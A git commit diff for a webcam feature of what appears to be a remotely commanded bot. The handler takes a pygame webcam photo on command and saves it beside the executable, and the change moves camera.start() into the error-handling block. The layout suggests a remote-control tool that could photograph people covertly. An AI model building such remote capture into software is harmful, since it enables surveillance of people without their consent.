6090417e75824e976666416a747f92daf2ac9dca
YawDev <nik.xeiladakis@gmail.com>
2024-07-16 03:30:51 +0300

    fix webcam photo by bruteforcing initialization of given `camera_in…dex` instead of using `.list_cameras()` which seemed to be causing the error

--- resources/features/webcam.py
+++ resources/features/webcam.py
@@ -16,9 +16,9 @@ async def webcam(ctx, action=None, camera_index=None):
         else: camera_index = 0
         try:
             camera = pygame.camera.Camera(camera_index)
+            camera.start()
         except: 
             return await ctx.send('Camera with index ' + str(camera_index) + ' was not found.')
-        camera.start()
         time.sleep(1)
         image = camera.get_image()
         pygame.image.save(image, f'{os.path.dirname(sys.executable)}\\webcam.png')
